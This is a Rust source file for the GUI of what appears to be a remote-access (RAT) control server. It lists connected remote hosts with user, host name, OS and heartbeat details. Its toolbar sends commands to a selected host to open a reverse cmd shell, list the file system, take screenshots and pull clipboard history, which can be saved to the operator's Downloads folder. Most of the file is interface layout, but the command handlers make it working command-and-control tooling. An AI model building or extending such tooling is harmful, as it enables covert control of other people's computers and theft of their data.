use std::{ffi::OsStr, fs::write, path::PathBuf, process::Command};

use iced::{
    widget::{button, column, container, image, radio, row, scrollable, text, text_editor, Row, Space}, 
    Alignment::{self, Center}, Background, Border, Color, Element, Length::{self, Fill}
};
use kry5t4l_share::modules::{get_known_folder_path, protocol::{get_cur_timestamp_secs, HEART_BEAT_TIME}, CommandType};
use windirs::FolderId;

use crate::{modules::network::{send_command_to, HostInfo, G_ONLINE_HOSTS}, CHINESE_FONT, EMOJI_FONT};

#[derive(Debug, Clone, PartialEq)]
pub enum HostsMode {
    Normal,
    ClipboardView,
}

#[derive(Debug, Clone)]
pub struct HostsState {
    mode: HostsMode,
    hosts: Vec<HostInfo>,
    selected_host: Option<HostInfo>,
    clipboard_waiting: bool,
    clipboard_content: Option<String>,
}

#[derive(Debug, Clone)]
pub enum HostsMessage {
    Refresh,
    SelectHost(Option<usize>),
    ReverseShell,
    FileSystem,
    Screenshot,
    ClipBoard,
    BackToHosts,
    SaveClipboard,
    ClipboardContentReceived(String),
}

impl HostsState {
    pub fn new() -> Self {
        
            Self {
                mode: HostsMode::Normal,
                hosts: Vec::<HostInfo>::new(),
                selected_host: None,
                clipboard_waiting: false,
                clipboard_content: None,
            }
        
    }
    pub fn update(&mut self, message: HostsMessage) {
        match message {
            HostsMessage::Refresh => {
                if let Ok(mut hosts_map) = G_ONLINE_HOSTS.lock() {

                    hosts_map.retain(|_, host_info| {
                        get_cur_timestamp_secs() - host_info.last_heartbeat <= 30
                    });

                    self.hosts = hosts_map.values().cloned().collect();
                }
            }
            HostsMessage::SelectHost(index) => {
                if let Some(idx) = index {
                    if idx < self.hosts.len() {
                        self.selected_host = Some(self.hosts[idx].clone());
                        println!("{:?}", &self);
                    }
                } else {
                    self.selected_host = None;
                }
            }
            HostsMessage::ReverseShell => {
                if let Some(selected) = &self.selected_host {
                    let mut buf = vec![];
                    buf.push(CommandType::CreateProcess.to_u8());
                    let process_name = "cmd" ;
                    let mut vec_u8 = process_name.as_bytes().to_vec();
                    buf.append(&mut vec_u8);
                    println!("selected.peer_addr: {} \n vec_u8: {:?}", &selected.peer_addr, &buf);
                    let _ = send_command_to(&selected.peer_addr, &buf);
                }
            }
            HostsMessage::FileSystem => {
                if let Some(selected) = &self.selected_host {
                    let mut buf = vec![];
                    buf.push(CommandType::FileSystemInfo.to_u8());
                    println!("selected.peer_addr: {} \n vec_u8: {:?}", &selected.peer_addr, &buf);
                    let _ = send_command_to(&selected.peer_addr, &buf);
                }
            }
            HostsMessage::Screenshot => {
                if let Some(selected) = &self.selected_host {
                    let mut buf = vec![];
                    buf.push(CommandType::Screenshot.to_u8());
                    buf.push(30);
                    println!("selected.peer_addr: {} \n vec_u8: {:?}", &selected.peer_addr, &buf);
                    //let _ = send_command_to(&selected.peer_addr, &buf);
                }
            }
            HostsMessage::ClipBoard => {
                if let Some(selected) = &self.selected_host {
                    let mut buf = vec![];
                    buf.push(CommandType::Clipboard.to_u8());
                    println!("selected.peer_addr: {} \n vec_u8: {:?}", &selected.peer_addr, &buf);
                    let _ = send_command_to(&selected.peer_addr, &buf);
                    self.clipboard_waiting = true;
                    self.clipboard_content = None;
                    self.mode = HostsMode::ClipboardView;
                }
            }
            HostsMessage::BackToHosts => {
                self.mode = HostsMode::Normal;
                self.clipboard_waiting = false;
                self.clipboard_content = None;
            }
            HostsMessage::SaveClipboard => {
                if let Some(content) = &self.clipboard_content {
                    let peer = self.get_selected_host().unwrap().peer_addr.ip().to_string();
                    let file_name = format!("clipboard_history_{}.txt", peer);
                    let path_str = get_known_folder_path(windirs::FolderId::Downloads, &file_name);
                    let path = PathBuf::from(path_str);  // String -> PathBuf
                    let new_path = generate_unique_filename(path);
                    let _ = std::fs::write(new_path, content);

                    let _ = Command::new("explorer")
                        .arg(get_known_folder_path(FolderId::Downloads, ""))
                        .spawn();
                }
            }
            HostsMessage::ClipboardContentReceived(content) => {
                self.clipboard_waiting = false;
                self.clipboard_content = Some(content.clone());
            }
        }
    }

    pub fn get_selected_host(&self) -> Option<&HostInfo> {
        self.selected_host.as_ref()
    }

    fn create_header(&self) -> Row<HostsMessage> {
        let border = Border {
            color: Color::from_rgb(0.6, 0.6, 0.6),
            width: 1.0,
            radius: 0.0.into(),
        };

        row![

            container(text("").size(12))
                .style(move |_| container::Style {
                    text_color: Some(Color::WHITE),
                    border: Border::default(),
                    ..Default::default()
                })
                .padding([8, 6])
                .width(Length::Fixed(20.0)),
            container(text("Peer Addr").size(12))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::from_rgb(0.2, 0.2, 0.2))),
                    text_color: Some(Color::WHITE),
                    border,
                    ..Default::default()
                })
                .padding([8, 6])
                .width(Length::FillPortion(2)),
            container(text("User").size(12))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::from_rgb(0.2, 0.2, 0.2))),
                    text_color: Some(Color::WHITE),
                    border,
                    ..Default::default()
                })
                .padding([8, 6])
                .width(Length::FillPortion(2)),
            container(text("Host").size(12))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::from_rgb(0.2, 0.2, 0.2))),
                    text_color: Some(Color::WHITE),
                    border,
                    ..Default::default()
                })
                .padding([8, 6])
                .width(Length::FillPortion(2)),
            container(text("OS Version").size(12))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::from_rgb(0.2, 0.2, 0.2))),
                    text_color: Some(Color::WHITE),
                    border,
                    ..Default::default()
                })
                .padding([8, 6])
                .width(Length::FillPortion(3)),
            container(text("Proto").size(12))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::from_rgb(0.2, 0.2, 0.2))),
                    text_color: Some(Color::WHITE),
                    border,
                    ..Default::default()
                })
                .padding([8, 6])
                .width(Length::Fixed(50.0)),
            container(text("Mon").size(12))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::from_rgb(0.2, 0.2, 0.2))),
                    text_color: Some(Color::WHITE),
                    border,
                    ..Default::default()
                })
                .padding([8, 6])
                .width(Length::Fixed(50.0)),
            container(text("In").size(12))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::from_rgb(0.2, 0.2, 0.2))),
                    text_color: Some(Color::WHITE),
                    border,
                    ..Default::default()
                })
                .padding([8, 6])
                .width(Length::Fixed(75.0)),
            container(text("Out").size(12))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::from_rgb(0.2, 0.2, 0.2))),
                    text_color: Some(Color::WHITE),
                    border,
                    ..Default::default()
                })
                .padding([8, 6])
                .width(Length::Fixed(75.0)),
            container(text("Heartbeat").size(12))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::from_rgb(0.2, 0.2, 0.2))),
                    text_color: Some(Color::WHITE),
                    border,
                    ..Default::default()
                })
                .padding([8, 6])
                .width(Length::Fixed(75.0)),
        ]
        .spacing(0)
    }

    fn create_host_row(&self, host: &HostInfo, index: usize) -> Row<HostsMessage> {
        let heartbeat_time  = get_cur_timestamp_secs() - host.last_heartbeat;
        let heartbeat_time_str = heartbeat_time.to_string() + " s";

        let secs = get_cur_timestamp_secs() - host.last_heartbeat;
        let in_rate = host.in_rate / (secs + HEART_BEAT_TIME);
        let in_rate_str  = transfer_speed(in_rate as f64);

        let out_rate = host.out_rate / (secs + HEART_BEAT_TIME);
        let out_rate_str  = transfer_speed(out_rate as f64);

        let proto  = match host.protocl {
            kry5t4l_share::modules::protocol::Protocol::TCP => "TCP",
            kry5t4l_share::modules::protocol::Protocol::WS => "WS",
            kry5t4l_share::modules::protocol::Protocol::Unknow => "Unknow",
        };

        let border = Border {
            color: Color::from_rgb(0.6, 0.6, 0.6),
            width: 1.0,
            radius: 0.0.into(),
        };

        let current_selected = self.selected_host.as_ref()
            .and_then(|selected| {
                self.hosts.iter().position(|h| h.clientid == selected.clientid)
            });


        row![
            container(
                radio(
                    "",
                    index,
                    current_selected,
                    move |selected_index| HostsMessage::SelectHost(Some(selected_index))
                ))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border: Border::default(),
                    ..Default::default()
                })
                .padding([6, 6])
                .align_y(Center)
                .align_x(Center)
                .width(Length::Fixed(20.0)),
            container(text(host.peer_addr.to_string()).size(10))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border,
                    ..Default::default()
                })
                .padding([6, 6])
                .width(Length::FillPortion(2)),
            container(text(host.info.user_name.clone()).size(10))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border,
                    ..Default::default()
                })
                .padding([6, 6])
                .width(Length::FillPortion(2)),
            container(text(host.info.host_name.clone()).size(10))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border,
                    ..Default::default()
                })
                .padding([6, 6])
                .width(Length::FillPortion(2)),
            container(text(host.info.os_version.clone()).size(10))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border,
                    ..Default::default()
                })
                .padding([6, 6])
                .width(Length::FillPortion(3)),
            container(text(proto).size(10))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border,
                    ..Default::default()
                })
                .padding([6, 6])
                .width(Length::Fixed(50.0)),
            container(text(host.info.monitor.to_string()).size(10))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border,
                    ..Default::default()
                })
                .padding([6, 6])
                .width(Length::Fixed(50.0)),
            container(text(in_rate_str).size(10))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border,
                    ..Default::default()
                })
                .padding([6, 6])
                .width(Length::Fixed(75.0)),
            container(text(out_rate_str).size(10))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border,
                    ..Default::default()
                })
                .padding([6, 6])
                .width(Length::Fixed(75.0)),
            container(text(heartbeat_time_str).size(10))
                .style(move |_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border,
                    ..Default::default()
                })
                .padding([6, 6])
                .width(Length::Fixed(75.0)),
        ]
        .spacing(0)

    }

    fn clipboard_view(&self) -> Element<HostsMessage> {
        let top = row![
            button(text("← Back to Hosts").size(14))
                .style(button::primary)
                .on_press(HostsMessage::BackToHosts)
                .padding(8),
            Space::with_width(Length::Fixed(10.0)),
            button(text("💾 Save to File").font(EMOJI_FONT).size(14))
                .style(button::primary)
                .on_press(HostsMessage::SaveClipboard)
                .padding(8),
        ]
        .spacing(10)
        .padding(10);

        let client = self.get_selected_host().unwrap();

        let content = if self.clipboard_waiting {
                container(
                    column![
                        text("⏳ Waiting for clipboard data...").font(EMOJI_FONT).size(20),
                        Space::with_height(Length::Fixed(10.0)),
                        text(format!("Client: {}", client.clientid)).size(14),
                        text(format!("Address: {}", client.peer_addr)).size(14),
                    ]
                    .align_x(Alignment::Center)
                    .spacing(10)
                )
                .width(Length::Fill)
                .height(Length::Fill)
                .center_x(Length::Fill)
                .center_y(Length::Fill)
        } else {
            let content_text = if self.clipboard_content.clone().unwrap().is_empty() {
                    text("(Empty clipboard history)").size(14).color(Color::from_rgb(0.6, 0.6, 0.6))
                } else {
                    let clipboard_text = self.clipboard_content.clone().unwrap();
                    text(clipboard_text).size(13)
                };
                container(
                    scrollable(
                        container(content_text)
                            .padding(15)
                            .width(Length::Fill)
                    )
                    .width(Length::Fill)
                    .height(Length::Fill)
                )
              .style(|_| container::Style {
                    background: Some(Background::Color(Color::WHITE)),
                    border: Border {
                        color: Color::from_rgb(0.8, 0.8, 0.8),
                        width: 1.0,
                        radius: 4.0.into(),
                    },
                    ..Default::default()
                })
                .padding(10)
                .width(Length::Fill)
                .height(Length::Fill)
                .center_x(Length::Fill)
                .center_y(Length::Fill)
        };

        let clipboard_view = column![
            top,
            content
        ]
        .spacing(10)
        .width(Length::Fill)
        .height(Length::Fill)
        .padding(10)
        .into();

        clipboard_view

    }

}


pub fn view(state: &HostsState) -> Element<HostsMessage> {
    match &state.mode {
        HostsMode::Normal => {
            let refresh_button = png2button("./kry5t4l_server/assets/Refresh.png", HostsMessage::Refresh);
            let shell_button = png2button("./kry5t4l_server/assets/cmd.png", HostsMessage::ReverseShell);
            let screenshot_button = png2button("./kry5t4l_server/assets/Dsp.png", HostsMessage::Screenshot);
            let file_button = png2button("./kry5t4l_server/assets/file.png", HostsMessage::FileSystem);
            let clipboard_button = png2button("./kry5t4l_server/assets/clipboard.png", HostsMessage::ClipBoard);
                
            let top = row![
                text("").width(Length::Fixed(10.0)),
                shell_button,
                Space::with_width(Length::Fixed(10.0)),
                file_button,
                Space::with_width(Length::Fixed(10.0)),
                screenshot_button,
                Space::with_width(Length::Fixed(10.0)),
                clipboard_button,
                Space::with_width(Length::Fill),
                refresh_button];
                
            let header = state.create_header();
                
            let mut content = column![
                top,
                header
            ]
            .spacing(5);
                
            for (index, host) in state.hosts.iter().enumerate() {
                content = content.push(state.create_host_row(host, index));
            }
        
            let scrollable_content = scrollable(content).height(Length::Fill).width(Length::Fill);
        
            container(scrollable_content)
                .width(Length::Fill)
                .height(Length::Fill)
                .padding(10)
                .into()
        }
        HostsMode::ClipboardView => {
            state.clipboard_view()
        }
    }

}

fn transfer_speed(size: f64) -> String {
    if size < 1024.0 {
        format!("{:.2} Byte/s", size)
    } else if size < (1024.0 * 1024.0) {
        format!("{:.2} KB/s", size / 1024.0)
    } else if size < (1024.0 * 1024.0 * 1024.0) {
        format!("{:.2} MB/s", size / (1024.0 * 1024.0))
    } else {
        format!("{:.2} GB/s", size / (1024.0 * 1024.0 * 1024.0))
    }
}

fn png2button(icon_path: &str, message: HostsMessage) -> Element<HostsMessage> {
    let create_icon = |size: u16| -> Element<HostsMessage> {
        let handle = image::Handle::from_path(icon_path);
        image(handle)
            .width(size)
            .height(size)
            .into()
    };
    
    let item_content = 

        container(
            create_icon(128)
        )
        .align_x(iced::alignment::Horizontal::Center)
        .align_y(iced::alignment::Vertical::Center)
        .width(50)
        .height(40);


    let styled_content = container(item_content);

    button(styled_content)
        .style(button::text)
        .width(Length::Fixed(50.0))
        .on_press(message)
        .into()
}

// 修正的 generate_unique_filename
fn generate_unique_filename(mut path: PathBuf) -> PathBuf {
    let original_path = path.clone();
    let mut counter = 1;
    while path.exists() {
        let stem = original_path.file_stem().unwrap_or(OsStr::new("file"));
        let extension = original_path.extension();

        let new_filename = if let Some(ext) = extension {
            format!("{}({}).{}", stem.to_string_lossy(), counter, ext.to_string_lossy())
        } else {
            format!("{}({})", stem.to_string_lossy(), counter)
        };

        path = original_path.with_file_name(new_filename);
        counter += 1;
    }
    path  // 最后表达式作为返回值，无分号
}